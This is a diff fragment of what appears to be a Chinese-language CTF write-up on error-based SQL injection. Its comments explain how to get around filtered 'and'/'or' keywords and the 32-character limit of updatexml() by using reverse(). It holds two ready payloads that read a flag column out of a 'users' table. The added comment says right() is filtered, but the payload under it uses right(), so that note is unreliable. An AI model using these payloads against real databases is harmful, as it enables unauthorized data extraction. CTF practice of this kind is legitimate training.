@@ -111,5 +111,6 @@ and or 被过滤，使用||，&&，^等
 #updatexml()函数有长度限制（32位），使用reverse()进行倒序输出，将其与前段的flag进行拼接得到flag
 123"||(updatexml(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
 
+#这里right()函数被过滤了，所以用reverse()
 123"||(updatexml(1,concat('~',((select(right(real_flag_1s_here,30))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
 ```
